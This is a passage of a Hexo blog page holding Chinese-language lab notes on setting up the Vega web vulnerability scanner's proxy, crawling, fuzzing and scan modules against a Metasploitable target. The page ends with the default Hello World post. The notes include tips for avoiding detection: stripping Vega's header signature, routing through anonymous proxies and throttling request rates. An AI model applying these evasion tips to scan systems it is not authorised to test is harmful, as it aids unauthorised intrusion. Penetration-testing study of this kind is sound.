+<h6 id="Vega"><a href="#Vega" class="headerlink" title="Vega"></a>Vega</h6><p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200713215734456.png" alt="image-20200713215734456"></p>
+<p>图形化的扫描工具</p>
+<p>代理模式几乎是所有扫描器都会提供的一个功能</p>
+<p>因为有代理可以实现对请求接收数据 进行任意的把玩之后再进行下一步操作</p>
+<p>扫描器可以全自动工作，也可以通过代理截断的方式手动操作</p>
+<p>一般是通过代理阶段手动的爬出能提交请求的页面——即爬站</p>
+<p>（显然这部分通常没有攻击性的迹象）（除非你提交侵入性的数据，一般都在这步提交正常的数据）</p>
+<p>在把能爬的都记录到代理服务器上之后，可以进行自动或手动的Fuzz了，就是用字典去碰名称，找出可能的隐藏目录，隐藏页面</p>
+<p>Fuzz能爬出一些本应不可见的内容，加上第一步的内容，就完成了爬站的主题内容</p>
+<p>然后再基于爬出来的资源列表，对这些资源逐个参数进行渗透，发现漏洞</p>
+<p>vega偏向于web application的软件漏洞，不太关注web server的版本的漏洞，也就是常见的sql注入等方面是重点关注的</p>
+<p>（而Nikto 则更侧重web server 版本更新上的漏洞）</p>
+<p>除了vega 开源扫描器，vega的公司还有两个商业项目——一个是绝对安全的操作系统（从内核和应用做了努力），另一个忘了</p>
+<p>一样先打开kali，再打开metasploitable</p>
+<p>在kali里打开vega（在web程序分类里）</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200713222907502.png" alt="image-20200713222907502"></p>
+<p>点击右边Proxy——即代理模式</p>
+<p>一般一个扫描器支持代理功能，基本都启用，先人工的方式去爬站，然后再使用扫描模式的功能进行Fuzz，这样尽可能的全爬出来</p>
+<p>先看设置，所有的设置都在references里</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200713223242564.png" alt="image-20200713223242564"></p>
+<p>共有三项可供配置的</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200713223424856.png" alt="image-20200713223424856"></p>
+<p>第一个general即常规，可以配置代理服务器，这个不是vega自己的代理服务器，而是外部的服务器</p>
+<p>这里是vega 的代理功能是实现代理截断，其本质仍然是使用本机的ip（客户端即浏览器也是本机ip），即如果在vega 用代理模式对站点进行操作导致站点封后，即使用本机的浏览器也登不上去了</p>
+<p>所以可以在vega里再设置一个代理服务器避免这种情况发生</p>
+<p>（可以采用网上免费的代理，但要选择匿名的代理，因为有的代理是透明代理，转发的时候还是用你的ip） </p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200713223900870.png" alt="image-20200713223900870"></p>
+<p>第二个就是一些界面显示的方式</p>
+<p>第三个就是自动更新</p>
+<p>两个都勾上</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200713224815764.png" alt="image-20200713224815764"></p>
+<p>下面的Proxy就不是外部代理了</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200713225012573.png" alt="image-20200713225012573"></p>
+<p>是vega 自己的代理的一些参数，vega可以给自己设置http头的参数，（可以看到这个http头就是常见的参数比如浏览器类型、协议）（只是最后面添加了一个vega的版本）</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200717204132769.png" alt="image-20200717204132769"></p>
+<p>实际使用的时候可以去掉，可以隐蔽（不要忘记低级错误）</p>
+<p>第一项就是覆盖原有的http头</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200717204326393.png" alt="image-20200717204326393"></p>
+<p>第二项是组织浏览器进行缓存（因为有些资源如果存储到本地，就不会去请求服务器了，对发现漏洞不利）一般勾选</p>
+<p> 第三项是阻止中间的代理服务器缓存内容</p>
+<p>下一个</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200717204604628.png" alt="image-20200717204604628"></p>
+<p>是侦听的代理端口</p>
+<p>一旦启用代理模式，vega本身就是一个代理软件了，浏览器在设置代理ip和端口的时候，应该设置的就是这里的</p>
+<p>即这里是vega这个代理服务器的ip和端口</p>
+<p>因为是本机使用，所以ip可以设为127.0.0.1端口默认8888</p>
+<p>但如果想把vega让本地网络的主机也能使用，就需要写真实的物理网卡的地址    </p>
+<p>下一个是扫描器</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200717205207478.png" alt="image-20200717205207478"> </p>
+<p>扫描器指的就是主动扫描的这块，首先也是http头，末尾也有vega版本，删掉</p>
+<p>下面是性能的一些配置 </p>
+<p>最大扫描多少个路径</p>
+<p>在单个节点上对打扫描多少个子路径</p>
+<p>路径扫多深（即套链接）（越深越全面但时间越长，且会增加被发现的可能） </p>
+<p>最大重复路径枚举</p>
+<p>在报警报告里显示的最大字符串长度</p>
+<p>每秒最大数量的请求（太快容易发现，但减少时间）</p>
+<p>最后一项没提</p>
+<p>下一个是debug选项</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200717205714038.png" alt="image-20200717205714038"></p>
+<p>第一个是不是要记录所有的扫描请求</p>
+<p>第二个是不是在控制台显示debug输出</p>
+<p>（控制台是在左下角的惊叹号那里）</p>
+<p>最重要的是ip地址那里，设好这个才能启动代理模式</p>
+<p>工作模式启动在代理模式</p>
+<p>左边点击start http proxy</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200717210447904.png" alt="image-20200717210447904"></p>
+<p>这时候vega开始侦听8888端口</p>
+<p>本机查看一下端口状态确实8888处于侦听状态 </p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200717210521232.png" alt="image-20200717210521232"> </p>
+<p>第三个按钮是配置扫描模块</p>
+<p> <img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200717210635792.png" alt="image-20200717210635792"></p>
+<p>点击它可以看到</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200717210724904.png" alt="image-20200717210724904"></p>
+<p>默认是被动的扫描，由客户端发起请求，不更改，只是侦听数据分析有没有漏洞</p>
+<p>如果把所有的勾选上</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200717210818087.png" alt="image-20200717210818087"></p>
+<p>当流量经过的时候，就是对这俩的所有子项都进行分析（默认是扽西一部分）</p>
+<p>（第一个是注入模块，第二个是响应进程模块</p>
+<p>再下面第四个按钮</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200717211443690.png" alt="image-20200717211443690"></p>
+<p>如果按下这个按钮，所有的流量在流经vega时候，不会再窗口里显示出来，即vega变成了一个纯粹的代理服务器，所以一般不按这个按钮</p>
+<p>第五个是启动代理扫描</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200717211629972.png" alt="image-20200717211629972"></p>
+<p>即刚刚</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/26/kali%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" data-id="ckllljgll0000iguw7yjr5day" data-title="" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/02/25/hello-world/" class="article-date">
+  <time class="dt-published" datetime="2021-02-25T15:28:51.788Z" itemprop="datePublished">2021-02-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/02/25/hello-world/">Hello World</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/25/hello-world/" data-id="ckll1123m0000s8uwhmlb2oee" data-title="Hello World" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/02/26/kali%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/25/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
